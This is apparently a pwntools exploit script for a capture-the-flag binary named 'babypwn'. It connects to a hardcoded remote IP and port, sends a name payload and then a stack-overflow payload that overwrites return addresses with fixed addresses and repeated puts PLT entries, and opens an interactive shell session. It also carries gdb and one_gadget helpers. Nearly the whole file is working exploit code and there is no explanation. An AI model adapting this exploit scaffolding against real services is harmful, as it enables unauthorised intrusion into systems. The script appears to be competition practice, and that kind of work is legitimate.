# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './babypwn'
os.system('chmod +x %s'%binary)
# context.update( os = 'linux',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
# libc = elf.libc
libc = ELF('./libc.so.6')
DEBUG = 0
if DEBUG:
    # libc = elf.libc
    # p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/','-g','1234',binary])
    p = process(['qemu-aarch64','-L','/usr/aarch64-linux-gnu/',binary])
else:
    host = '1.13.171.197'
    port = '20000'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

# one_gad = one_gadget(libc.path)

def attack():
    
    lg("data", libc.sym['stderr'])
    lg("data", libc.sym['stdout'])
    lg("data", libc.sym['stdin'])

    puts_plt = elf.plt['puts']
    read_plt = elf.plt['read']
    

    sla("born" , "15")
    payload = "K33nLab\x00".ljust(0x18 , "\x00") + p32(2016) + p32(1000)
    sa('name' , payload)

    payload  = "a"*0x54 + p64(0x400080) + p64(0x400890) 
    payload +=  p64(puts_plt)*0x10


    sa('message:' , payload)
    sa('you' ,0x410fe0 )


    p.interactive()

attack()

'''
@File    :   babypwn.py
@Time    :   2022/10/15 13:25:03
@Author  :   Niyah 
'''